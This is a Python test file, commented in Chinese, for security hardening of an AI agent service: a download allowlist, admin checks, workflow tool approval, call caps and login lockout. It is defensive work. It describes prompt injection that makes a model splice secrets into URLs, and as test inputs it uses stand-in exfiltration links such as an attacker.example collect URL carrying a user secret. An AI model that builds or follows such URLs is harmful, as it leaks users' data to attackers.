"""2026-10-29 安全加固回归。

覆盖四件事：
  1. 管理员判定改为 uid 优先；默认不再内置可猜的用户名；
  2. ADMIN_USERNAMES 里的名字在注册入口被保留（防抢注提权）；
  3. download_file 的"下载允许清单"（防提示注入把内容拼进 URL 外带）；
  4. 工作流 tool 节点：需审批的工具直接拒绝 + 单次运行调用次数上限。

全部离线：不联网、不写用户数据。
"""

from __future__ import annotations

import asyncio
import os

import pytest

from agent.tools import download_file
from api.auth import _auth_rate_bucket, _client_ip, _is_reserved_admin_name
from core import account, config, quota
from core import session as session_mod
from core.urltools import extract_urls, normalize_url, url_allowed
from hybrid.context import TaskContext
from hybrid.workflow import WorkflowEngine, validate_definition

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


# ==================== 1. URL 归一 / 抽取 ====================


def test_normalize_url_strips_fragment_and_default_port():
    assert normalize_url("https://Example.COM:443/a/b#frag") == "https://example.com/a/b"
    assert normalize_url("http://example.com:80") == "http://example.com/"
    assert normalize_url("https://example.com:8443/a?b=1") == "https://example.com:8443/a?b=1"


def test_normalize_url_keeps_query_order():
    # 签名链接改参数顺序会失效，所以只归一、不重排
    a = normalize_url("https://x.com/a?b=1&c=2")
    b = normalize_url("https://x.com/a?c=2&b=1")
    assert a != b


def test_extract_urls_from_chinese_text():
    text = "看这两篇 https://a.com/x.pdf。以及 https://b.com/y?q=1，谢谢"
    got = extract_urls(text)
    assert got == ["https://a.com/x.pdf", "https://b.com/y?q=1"]


def test_url_allowed_requires_exact_normalized_match():
    allow = ["https://example.com/a.pdf"]
    assert url_allowed("https://EXAMPLE.com:443/a.pdf#x", allow) is True
    # 在允许链接后面加参数 = 外带尝试，必须拒绝
    assert url_allowed("https://example.com/a.pdf?d=secret", allow) is False
    assert url_allowed("https://evil.example/a.pdf", allow) is False


# ==================== 2. 下载允许清单 ====================


def test_download_file_rejects_unlisted_url():
    """严格模式（configurable 里有 download_allowlist）下，模型现编的地址一律拒绝。"""
    r = download_file.invoke(
        {"url": "https://attacker.example/collect?d=user-secret"},
        config={"configurable": {"download_allowlist": [], "user_urls": []}},
    )
    assert "不是本轮" in r
    assert "下载失败" in r


def test_download_allowlist_kill_switch(monkeypatch):
    """一键回退：关掉开关后退回旧行为（仍会被 netsafe 挡住内网地址）。"""
    monkeypatch.setattr(config, "DOWNLOAD_ALLOWLIST_ENABLED", False)
    r = download_file.invoke(
        {"url": "http://127.0.0.1/secret.pdf"},
        config={"configurable": {"download_allowlist": [], "user_urls": []}},
    )
    assert "不是本轮" not in r
    assert "下载失败" in r


def test_download_file_accepts_user_url_but_still_hits_network_guard():
    """用户原话里的链接会进允许清单；本测试只验证"不再被清单拒绝"。

    用一个必然被 netsafe 拒绝的内网地址，确保不会真的发请求。
    """
    r = download_file.invoke(
        {"url": "http://127.0.0.1/secret.pdf"},
        config={
            "configurable": {
                "download_allowlist": [],
                "user_urls": ["http://127.0.0.1/secret.pdf"],
            }
        },
    )
    assert "不是本轮" not in r
    assert "下载失败" in r


# ==================== 3. 管理员判定 ====================


def test_admin_by_uid_and_username(monkeypatch):
    monkeypatch.setattr(config, "ADMIN_UIDS", ["uid-admin"])
    monkeypatch.setattr(config, "ADMIN_USERNAMES", [])

    assert quota._is_admin("uid-admin") is True
    assert quota._is_admin("uid-other") is False

    monkeypatch.setattr(config, "ADMIN_UIDS", [])
    monkeypatch.setattr(config, "ADMIN_USERNAMES", ["alice"])
    # 用户名路径仍兼容（会查 users 表；不存在的 uid 直接 False）
    assert quota._is_admin("uid-not-exist") is False


def test_reserved_admin_name_case_insensitive(monkeypatch):
    monkeypatch.setattr(config, "ADMIN_USERNAMES", ["Admin"])
    assert _is_reserved_admin_name("admin") is True
    assert _is_reserved_admin_name("ADMIN") is True
    assert _is_reserved_admin_name(" Admin ") is True
    assert _is_reserved_admin_name("bob") is False


def test_auth_rate_bucket_is_case_insensitive():
    assert _auth_rate_bucket("Admin") == _auth_rate_bucket("ADMIN")
    assert _auth_rate_bucket("Admin") == _auth_rate_bucket(" admin ")


def test_env_example_has_no_default_admin_name():
    """默认配置里不能再出现可猜的管理员名（苞米呀）。"""
    with open(os.path.join(ROOT, ".env.example"), encoding="utf-8") as f:
        text = f.read()
    assert "ADMIN_USERNAMES=苞米呀" not in text
    assert "ADMIN_UIDS=" in text


# ==================== 4. 工作流 tool 节点 ====================


def _wf_tool(tool_name: str, args: dict, n_nodes: int = 1) -> object:
    nodes = [
        {
            "id": f"n{i}",
            "type": "tool",
            "config": {"tool": tool_name, "args": args, "output_key": f"o{i}"},
        }
        for i in range(n_nodes)
    ]
    edges = [{"source": f"n{i}", "target": f"n{i + 1}"} for i in range(n_nodes - 1)]
    return validate_definition(
        {"id": "sec_test", "entry": "n0", "nodes": nodes, "edges": edges}
    )


def _run_workflow(wf, goal: str = "测试") -> tuple[list, TaskContext]:
    engine = WorkflowEngine(wf=wf)
    ctx = TaskContext(owner_id="u-sec", goal=goal, current_mode="workflow")

    async def collect():
        return [ev async for ev in engine.stream(ctx, lambda: None)]

    return asyncio.run(collect()), ctx


def test_workflow_rejects_approval_required_tool(monkeypatch):
    """download_file 在 Agent 路径要用户确认；工作流没有确认回路，必须拒绝。"""
    monkeypatch.setattr(config, "TOOL_APPROVAL_ENABLED", True)
    wf = _wf_tool("download_file", {"url": "https://example.com/a.pdf"})
    events, ctx = _run_workflow(wf, goal="下载 https://example.com/a.pdf")

    errors = [e for e in events if e.event_type == "error"]
    assert errors, [e.event_type for e in events]
    assert "需要人工确认" in errors[0].payload.get("error", "")
    assert "o0" not in ctx.shared


def test_workflow_tool_call_cap(monkeypatch):
    """同一工具连调两次、上限设 1：第二次必须被拒，且第一次确实跑过。

    用 kb_search 而不是原先的 calculator：算数工具已于 2026-10-30 移除，
    而 kb_search 在没有注入 kb_id 时会立即返回说明文案（不发网络请求），
    是剩下几个工具里唯一适合离线跑上限断言的。
    """
    monkeypatch.setattr(config, "HYBRID_MAX_TOOL_CALLS", 1)
    wf = _wf_tool("kb_search", {"query": "测试"}, n_nodes=2)
    events, ctx = _run_workflow(wf)

    errors = [e for e in events if e.event_type == "error"]
    assert errors, [e.event_type for e in events]
    assert "上限" in errors[0].payload.get("error", "")
    # 第一次执行成功并有产物（无库时是一段说明文案）；第二次被上限拦下
    assert "o0" in ctx.shared
    assert "o1" not in ctx.shared


@pytest.mark.parametrize(
    "url",
    [
        "https://example.com/a.pdf",
        "http://example.com/a.pdf",
    ],
)
def test_normalize_url_scheme_kept(url):
    assert normalize_url(url).startswith(("http://", "https://"))


# ==================== 5. 注册 / 登录防滥用（S-03）====================


class _DummyRequest:
    def __init__(self, headers: dict | None = None, host: str = "1.2.3.4") -> None:
        self.headers = headers or {}
        self.client = type("C", (), {"host": host})()


def test_client_ip_prefers_forwarded_for():
    req = _DummyRequest({"x-forwarded-for": "9.9.9.9, 10.0.0.1"})
    assert _client_ip(req) == "9.9.9.9"
    assert _client_ip(_DummyRequest()) == "1.2.3.4"


def test_consume_key_daily_limit_and_no_overdraw(tmp_path, monkeypatch):
    """IP / 全站维度的每日额度：超限抛错，且超限的那次不计数。"""
    monkeypatch.setattr(session_mod, "_db_path", lambda: str(tmp_path / "q.db"))
    monkeypatch.setattr(config, "SIGNUP_IP_PER_DAY", 2)
    quota._ensure_tables()
    key = "signup:ip:test"
    quota.consume_key(key, "signup_ip", config.SIGNUP_IP_PER_DAY)
    quota.consume_key(key, "signup_ip", config.SIGNUP_IP_PER_DAY)
    with pytest.raises(quota.QuotaExceeded):
        quota.consume_key(key, "signup_ip", config.SIGNUP_IP_PER_DAY)
    assert quota.usage_today(key, "signup_ip") == 2


def test_login_lockout_after_repeated_failures(tmp_path, monkeypatch):
    """连续失败达到阈值后锁定；正确口令也进不来，且锁定期不再验口令。"""
    monkeypatch.setattr(session_mod, "_db_path", lambda: str(tmp_path / "u.db"))
    monkeypatch.setattr(config, "AUTH_MAX_FAILS", 3)
    monkeypatch.setattr(config, "AUTH_LOCK_MINUTES", 15)
    account._ensure_tables()

    account.create_user("lockme", "correct-horse")
    for _ in range(3):
        user, reason = account.login("lockme", "wrong")
        assert user is None and reason == account.LOGIN_BAD_PASSWORD

    user, reason = account.login("lockme", "correct-horse")
    assert user is None and reason == account.LOGIN_LOCKED

    # 成功登录会清零；这里手动把解锁时刻拨回过去，验证"锁到期后可再登录"
    with session_mod._get_conn() as conn:
        conn.execute("UPDATE users SET lock_until = 0 WHERE username = 'lockme'")
    user, reason = account.login("lockme", "correct-horse")
    assert reason == account.LOGIN_OK and user["username"] == "lockme"
